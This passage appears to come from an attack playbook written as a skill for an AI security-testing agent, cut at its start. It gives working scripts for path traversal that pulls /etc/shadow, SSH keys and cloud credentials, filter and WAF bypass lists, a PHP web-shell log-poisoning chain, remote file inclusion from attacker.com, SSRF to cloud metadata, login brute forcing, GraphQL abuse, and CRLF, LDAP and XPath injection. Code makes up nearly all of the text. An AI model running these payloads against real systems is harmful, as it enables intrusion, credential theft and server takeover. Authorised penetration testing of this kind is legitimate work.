    'file': ('../../../../../../../etc/passwd', open('/etc/hostname', 'rb'), 'application/octet-stream')
}
r = requests.post(TARGET, files=files, verify=False)
print(f"Status: {r.status_code}")
# Check if response contains /etc/passwd content
if 'root:x:' in r.text:
    print("[LFI VIA FILE UPLOAD — CIA:C:H] /etc/passwd extracted!")
PYEOF
```

**Traversal Depth Testing:**
```bash
# Test different traversal depths (don't know exact directory structure)
for depth in 1 2 3 4 5 6 7 8 9 10; do
  TRAVERSAL=$(python3 -c "print('../' * $depth + 'etc/passwd')")
  RESP=$(curl -sk -X POST "$TARGET/upload" \
    -F "file=@/etc/hostname;filename=$TRAVERSAL" -w " HTTP:%{http_code}")
  echo "Depth $depth: $(echo "$RESP" | grep -c 'root:x:') lines matched"
done
```

**Sensitive File Extraction (After LFI Confirmed):**
```bash
SENSITIVE_FILES=(
  "/etc/passwd"
  "/etc/shadow"
  "/etc/group"
  "/etc/hosts"
  "/etc/hostname"
  "/etc/resolv.conf"
  "/etc/fstab"
  "/etc/profile"
  "/etc/issue"
  "/etc/nginx/nginx.conf"
  "/etc/nginx/sites-enabled/default"
  "/etc/apache2/apache2.conf"
  "/etc/mysql/mariadb.conf.d/50-server.cnf"
  "/etc/mysql/my.cnf"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/app/.env"
  "/var/www/html/.env"
  "/var/www/.env"
  "/opt/app/config.yml"
  "~/.ssh/id_rsa"
  "~/.aws/credentials"
  "~/.bash_history"
)

for target_file in "${SENSITIVE_FILES[@]}"; do
  FILE_SLUG=$(echo "$target_file" | tr '/' '_')
  TRAVERSAL=$(python3 -c "print('../' * 8 + '$target_file'[1:])")
  curl -sk -X POST "$TARGET/upload" \
    -F "file=@/dev/null;filename=$TRAVERSAL" \
    -o "/tmp/lfi_${FILE_SLUG}.txt" -w " HTTP:%{http_code}"
  SIZE=$(stat -c%s "/tmp/lfi_${FILE_SLUG}.txt" 2>/dev/null || echo 0)
  [[ $SIZE -gt 10 ]] && echo "[EXTRACTED — CIA:C:H] $target_file → ${SIZE} bytes"
done
```

**Filter Bypass Variants for Filename:**
```bash
# If ../ is blocked, try encoding variants
FILENAME_BYPASSES=(
  "....//....//....//....//....//etc/passwd"
  "..\\/..\\/..\\/..\\/etc/passwd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
  "..%252f..%252f..%252fetc/passwd"
  "..%c0%af..%c0%af..%c0%afetc/passwd"
  "..;/..;/..;/etc/passwd"
  "../../../../../../etc/passwd%00.jpg"
  "../../../../../../etc/passwd%00.png"
)

for bypass in "${FILENAME_BYPASSES[@]}"; do
  RESP=$(curl -sk -X POST "$TARGET/upload" \
    -F "file=@/etc/hostname;filename=$bypass" -w " HTTP:%{http_code}")
  [[ "$RESP" == *"root:x:"* ]] && echo "[FILENAME BYPASS — CIA:C:H] $bypass"
done
```

**Post-Exploitation — RCE Pivot (if PHP execution path discovered):**
```bash
# If LFI confirmed and PHP is used, try log poisoning chain
# 1. Inject PHP into access log via User-Agent
curl -sk "$TARGET/" -A "<?php system(\$_GET['cmd']); ?>"
# 2. Use filename traversal to read the log file → PHP executes
curl -sk -X POST "$TARGET/upload" \
  -F "file=@/dev/null;filename=../../../../../../../var/log/apache2/access.log"

# If /proc/self/environ reveals DOCUMENT_ROOT, chain to RCE:
# 1. Upload PHP shell normally (content-type bypass)
# 2. Use filename traversal to confirm shell location
# 3. Access shell directly for RCE
```

---

## Phase 19: RFI — CIA: C:H I:H A:H

```
TRIGGER: Phase 2 assigns RFI, or PHP app detected with allow_url_include potential.
SURFACE TYPES: PHP applications with allow_url_include=On.
```

### SUB-PHASE 19.2: HUNT

```bash
# Requires allow_url_include=On (PHP) — check if enabled first via LFI
# /proc/self/environ → PHP_INI_SCAN_DIR or phpinfo.php → allow_url_include = On
for rfi in "http://attacker.com/shell.php" "ftp://attacker.com/shell.php"; do
  curl -sk "$TARGET/view?page=$rfi" -H "Authorization: Bearer $USER1_TOKEN" | head -3
done
# If allow_url_include=Off → NOT exploitable → log as DEAD_END in KB, do not report
# If On → critical finding → chain with CMDI/RCE for full server compromise
```

---

## Phase 22: HTTP Request Smuggling — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns smuggling, or load-balanced/reverse-proxy infrastructure detected.
SURFACE TYPES: load-balanced apps, reverse proxy setups (nginx + backend, CDN + origin).
```

### SUB-PHASE 22.2: HUNT

**CL.TE probe:**
```bash
mcp_burp_send_http1_request(
  host="target.com", port=443, use_https=True,
  request="POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
)
```

**TE obfuscation variants:**
```bash
# "Transfer-Encoding: xchunked"
# "Transfer-Encoding : chunked"  (space before colon)
# "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"
```

**Automated detection:**
```bash
python3 /opt/smuggler/smuggler.py -u $TARGET/ -l 2 --no-color 2>&1 | tee ~/agents/finetune/fullrecon/${SLUG}/smuggling.txt
```

---

## Phase 23: Web Cache Poisoning — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns cache-poisoning, or CDN headers detected (cf-ray, x-cache).
SURFACE TYPES: pages served via CDN (Cloudflare, Fastly, Akamai, CloudFront).
```

### SUB-PHASE 23.2: HUNT

**Unkeyed header reflection:**
```bash
UNKEYED_HEADERS=("X-Forwarded-Host" "X-Forwarded-For" "X-Forwarded-Scheme"
  "X-Host" "X-Original-URL" "X-Rewrite-URL" "Origin" "Forwarded")
for h in "${UNKEYED_HEADERS[@]}"; do
  RESP=$(curl -sk "$TARGET/" -H "$h: evil.com" -H "Cache-Control: no-cache")
  echo "$RESP" | grep -qi "evil.com" && echo "[CACHE POISON CANDIDATE — CIA:C:H] $h reflected"
done
```

**XSS via cache poisoning:**
```bash
curl -sk "$TARGET/" \
  -H 'X-Forwarded-Host: attacker.com"><script>console.log(1)</script>' \
  -H "Cache-Control: no-cache" | grep -i "attacker.com"
```

**Fat GET:**
```bash
curl -sk -X GET "$TARGET/api/endpoint?param=normal" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "param=evil"
```

---

## Phase 24: Web Cache Deception — CIA: C:H

```
TRIGGER: Phase 2 assigns cache-deception, or app serves auth content on static-looking paths.
```

### SUB-PHASE 24.2: HUNT

```bash
CACHE_PATHS=(".css" ".js" ".png" ".ico" ".woff" ".jpg" ".gif" ".svg")
SENSITIVE_ENDPOINTS=("/account/settings" "/profile" "/api/user/me" "/dashboard" "/api/orders")
for endpoint in "${SENSITIVE_ENDPOINTS[@]}"; do
  for ext in "${CACHE_PATHS[@]}"; do
    RESP=$(curl -sk -w " HTTP:%{http_code}" "$TARGET${endpoint}${ext}" \
           -H "Authorization: Bearer $USER1_TOKEN")
    echo "$RESP" | grep "HTTP:200" | grep -qiE "email|token|user|password|credit|balance" \
      && echo "[CACHE DECEPTION — CIA:C:H] ${endpoint}${ext} returns auth data"
  done
done
```

---

## Phase 31: HTTP Parameter Pollution (HPP) — CIA: I:M → chains to C:H I:H

```
TRIGGER: Phase 2 assigns parameter-pollution, or WAF bypass needed.
SOURCE: wiki/raw-refs/path-traversal-hpp-2026, wiki/raw-refs/path-encoding-mutation-2026
```

### SUB-PHASE 31.2: HUNT

**Framework Parsing Detection:**
```bash
# How does the backend handle duplicate params?
curl -sk "$TARGET/api/test?a=1&a=2" -H "Authorization: Bearer $USER1_TOKEN" | jq .
# PHP: last value wins → a=2
# Node.js/Express: creates array → a=["1","2"]
# ASP.NET: joins with comma → a="1,2"
# Flask/Werkzeug: first value wins → a=1
```

**WAF Bypass via HPP:**
```bash
# WAF sees first param, backend uses last
curl -sk "$TARGET/search?q=SAFE&q='; DROP TABLE users--" -H "Authorization: Bearer $USER1_TOKEN"
curl -sk "$TARGET/api/user?role=user&role=admin" -H "Authorization: Bearer $USER1_TOKEN" | jq .role

# Logic bypass
curl -sk -X POST "$TARGET/api/transfer" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: $USER1_COOKIE" \
  -d "amount=1000&amount=0.01"
```

**ASP.NET Comma-Separated XSS:**
```bash
# ASP.NET merges duplicate params with comma → XSS
curl -sk "$TARGET/page.aspx?id=1,alert(1)" -H "Authorization: Bearer $USER1_TOKEN"
# Request.QueryString["id"] returns "1,alert(1)" → rendered as script
```

**OAuth Redirect HPP:**
```bash
# Encoded traversal in redirect_uri
curl -sk "$TARGET/auth?redirect_uri=app://callback%2F..%2F..%2Fattacker.com"
# decodeURIComponent() normalizes → redirect to attacker domain
```

**Rate Limit Bypass via HPP:**
```bash
# Duplicate params split traffic across backend instances
for i in $(seq 1 100); do
  curl -sk "$TARGET/api?token=A&token=B" -H "Authorization: Bearer $USER1_TOKEN" -o /dev/null &
done
# Rate limiter tracks param A, backend uses param B → different bucket
```

**Server-Side Parameter Smuggling (SSPP):**
```bash
# Encoded injection in param name → decoded differently by backend
curl -sk "$TARGET/api?name=test%0a%0dX-Injected:%20true"
# App decodes param name; backend re-interprets decoded value as new header
```

**Client-Side Path Traversal (CSPT):**
```bash
# Modify URL hash → client router navigates to attacker-controlled route
# Test: change hash to include traversal paths
# Check: does client fetch unexpected endpoints?
```
**Ref:** [[raw-refs/path-traversal-hpp-2026]], [[raw-refs/path-encoding-mutation-2026]]

---

## Phase 32: GraphQL Security — CIA: C:H I:H

```
TRIGGER: Phase 2 assigns graphql, or JS signals Apollo, urql, gql.
SURFACE TYPES: GraphQL endpoints (/graphql, /api/graphql, /gql, /query).
```

### SUB-PHASE 32.2: HUNT

**Endpoint discovery:**
```bash
for path in "/graphql" "/api/graphql" "/v1/graphql" "/gql" "/query" "/graphiql"; do
  S=$(curl -sk -w "%{http_code}" -X POST "$TARGET$path" \
       -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -o /dev/null)
  [[ "$S" == "200" ]] && echo "[GRAPHQL ENDPOINT] $TARGET$path"
done
```

**Introspection:**
```bash
GQL_ENDPOINT="$TARGET/graphql"
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER1_TOKEN" \
  -d '{"query":"{ __schema { types { name kind fields { name type { name } } } } }"}' \
  | jq . > ~/agents/finetune/fullrecon/${SLUG}/gql_schema.json
```

**Alias batching (rate limit bypass → brute force):**
```bash
python3 - << 'EOF'
import requests, json, os
TARGET = os.environ.get('TARGET', '')
aliases = "\n".join(f'a{i}: login(email:"test{i}@t.com",password:"pass{i}") {{ token }}' for i in range(50))
r = requests.post(f"{TARGET}/graphql",
    headers={"Content-Type":"application/json","Authorization":f"Bearer {os.environ.get('USER1_TOKEN','')}"},
    json={"query": f"mutation {{ {aliases} }}"}, timeout=15)
print(r.status_code, r.text[:500])
EOF
```

**Authorization bypass via nesting:**
```bash
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER1_TOKEN" \
  -d '{"query":"{ publicPost(id: 1) { author { adminNotes privateData } } }"}' | jq .
```

**Global ID BOLA/IDOR (CVE-2026 pattern):**
```bash
# Decode a legitimate GID, increment integer, re-encode
echo "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA0Mjg4" | base64 -d
# gid://hackerone/Report/3604288 → try 3604289
echo -n "gid://hackerone/Report/3604289" | base64
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -d "{\"query\":\"query { node(id: \\\"$(echo -n 'gid://hackerone/Report/3604289' | base64)\\\") { ... on Report { id title reporter { email } } } }\"}" | jq .
```

**Operation name auth bypass:**
```bash
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -d '{"query":"query getPastes { getPastes { id content } systemHealth { cpuUsage internalIPs } }"}' | jq .
```

**Introspection regex bypass:**
```bash
# Newline bypass
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -d '{"query":"query{__schema\n{queryType{name}}}"}' | jq .
# Space bypass
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -d '{"query":"query{__schema {queryType{name}}}"}' | jq .
# GET method
curl -sk "$GQL_ENDPOINT?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D"
```

**Array-based batch bypass:**
```bash
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -d '[{"query":"query { me { id email } }"},{"query":"query { me { id email } }"},{"query":"query { me { id email } }"}]' | jq .
```

**Query complexity DoS:**
```bash
# Deep nesting
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -d '{"query":"query { user { friends { friends { friends { friends { name } } } } } }"}' -w "%{time_total}"
# Fragment bomb
curl -sk -X POST "$GQL_ENDPOINT" -H "Content-Type: application/json" \
  -d '{"query":"query { a1: user { ...F1 } a2: user { ...F1 } } fragment F1 on User { friends { ...F2 } } fragment F2 on User { friends { ...F3 } } fragment F3 on User { friends { name } }"}' -w "%{time_total}"
```

**Spring Boot Actuator (Phase 46 Extension):**
```bash
# CVE-2026-40976: framework auth bypass — test all endpoints without auth
curl -sk https://target.com/actuator/env | jq .
curl -sk https://target.com/actuator/heapdump -o heapdump.hprof
curl -sk https://target.com/api/admin/users  # Should be 401, may return 200

# CVE-2026-22731: health group path bypass
curl -sk https://target.com/actuator/health | jq '.groups'
curl -sk https://target.com/healthz/admin/users

# CVE-2026-22733: CloudFoundry path bypass
curl -sk https://target.com/cloudfoundryapplication/admin
curl -sk https://target.com/cloudfoundryapplication/api/internal

# Gateway routes → SSRF
curl -sk -X POST https://target.com/actuator/gateway/routes/evil_route \
  -H "Content-Type: application/json" \
  -d '{"id":"evil_route","predicates":[{"name":"Path","args":{"pattern":"/evil/**"}}],"uri":"http://169.254.169.254"}'
curl -sk -X POST https://target.com/actuator/gateway/refresh
curl -sk https://target.com/evil/latest/meta-data/iam/security-credentials/

# Jolokia → JNDI RCE
curl -sk https://target.com/actuator/jolokia/list | grep -i "reloadByURL"

# Log level manipulation → credential harvesting
curl -sk -X POST https://target.com/actuator/loggers/org.springframework.security \
  -H 'Content-Type: application/json' -d '{"configuredLevel":"TRACE"}'
curl -sk https://target.com/actuator/logfile | grep -iE "Authorization:|password="
```

---

## Phase 38: CRLF Injection & Header Injection — CIA: I:M (base) → chains to C:H I:H

```
TRIGGER: Phase 2 assigns crlf, or redirect endpoints/URL-reflecting responses detected.
```

### SUB-PHASE 38.2: HUNT

```bash
for payload in \
  "%0d%0aSet-Cookie:%20sessionid=attacker_injected" \
  "%0d%0aX-Injected:%20evil" \
  "%0d%0a%0d%0a<html><script>console.log(1)</script>" \
  "%0aX-Header:%20injected" \
  "%250d%250aX-Injected:%20double-encoded" \
  "%0d%0aCache-Control:%20no-store%0d%0aX-Cache-Key:%20poisoned" \
  "%0d%0aX-Frame-Options:%20ALLOWALL%0d%0aX-XSS-Protection:%200" \
  "%0d%0aLocation:%20https://evil.com%0d%0a%0d%0a" \
  "%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>" \
  "%00%0d%0aX-NullByte:%20bypass" \
  "%0D%0ACase-Variation:%20test" \
  "%u000aUnicode:%20inject"; do
  RESP=$(curl -sk -D - "$TARGET/redirect?url=/page$payload" -o /dev/null)
  echo "$RESP" | grep -iE "Set-Cookie.*attacker|X-Injected|^attacker|X-Cache-Key|ALLOWALL|Location.*evil|text/html.*script|NullByte|Case-Variation|Unicode" \
    && echo "[CRLF — CIA:I:M] $payload"
done
```

**WAF Bypass Hunt:**
```bash
# If basic %0d%0a blocked, try evasions:
for bypass in "%0a" "%250a" "%u000a" "%00%0d%0a" "%0D%0A" "%%0a0a"; do
  RESP=$(curl -sk -D - "$TARGET/page?param=${bypass}X-Injected:true" -o /dev/null)
  echo "$RESP" | grep -i "X-Injected" \
    && echo "[CRLF WAF BYPASS] $bypass"
done
```

**Content-Encoding Deflate Bypass (Akamai-style):**
```bash
# If WAF blocks all CRLF variants, try Content-Encoding: deflate
python3 -c "
import zlib, requests
payload = b'HTTP/1.1 200 OK\r\nX-Injected: true\r\n\r\n<html>poisoned</html>'
compressed = zlib.compress(payload)
r = requests.get('$TARGET/page', headers={'Content-Encoding': 'deflate', 'X-Original': 'test'}, data=compressed)
print(r.headers)
"
```

---

## Phase 40: LDAP Injection — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns ldap, or JS signals ldap, activedirectory, ldapjs.
SURFACE TYPES: LDAP-backed login, directory search, corporate SSO, Active Directory auth.
```

### SUB-PHASE 40.2: HUNT

**Auth bypass:**
```bash
# Normal: (&(uid=USER)(password=PASS))
# Inject: admin)(&  → (&(uid=admin)(&)(password=x)) → matches admin
for inject in "admin)(&" "*" "admin)|(uid=*" "*)(uid=*))(|(uid=*"; do
  curl -sk -X POST "$TARGET/api/ldap-login" -H "Content-Type: application/json" \
    -d "{\"username\":\"$inject\",\"password\":\"x\"}" | jq . | head -5
done
```

**Blind enumeration:**
```bash
for attr in "description" "mail" "telephoneNumber" "memberOf" "sAMAccountName"; do
  R=$(curl -sk -o /dev/null -w "%{size_download}" \
       "$TARGET/api/ldap-search?q=admin)(|($attr=*))(uid=*")
  echo "$attr → $R bytes"
done
```

---

## Phase 41: XPath Injection — CIA: C:H I:M

```
TRIGGER: Phase 2 assigns xpath, or JS signals xpath, XPathEvaluator.
SURFACE TYPES: XML-backed auth, XML data stores, SOAP services.
```

### SUB-PHASE 41.2: HUNT

**Auth bypass:**
```bash
# Normal: //users/user[name/text()='USER' and password/text()='PASS']
# Inject: ' or '1'='1
for inject in "' or '1'='1" "' or 1=1 or '1'='1" "'] | //user | a['"; do
  curl -sk -X POST "$TARGET/api/xml-login" -H "Content-Type: application/json" \
    -d "{\"username\":\"$inject\",\"password\":\"x\"}" -w " HTTP:%{http_code}"
done
```

**Blind XPath — extract char by char:**
```bash
for i in $(seq 1 20); do
  for c in {a..z} {0..9}; do
    inject="' and substring(//user[1]/password/text(),$i,1)='$c' and '1'='1"
    RESP=$(curl -sk "$TARGET/api?user=$inject")
    [[ "$RESP" == *"Welcome"* ]] && echo "Char $i: $c" && break
  done
done
```

---

*SKILL-INJECTION-HUNT — Part of the acy Agentic Security Research System v3.0*
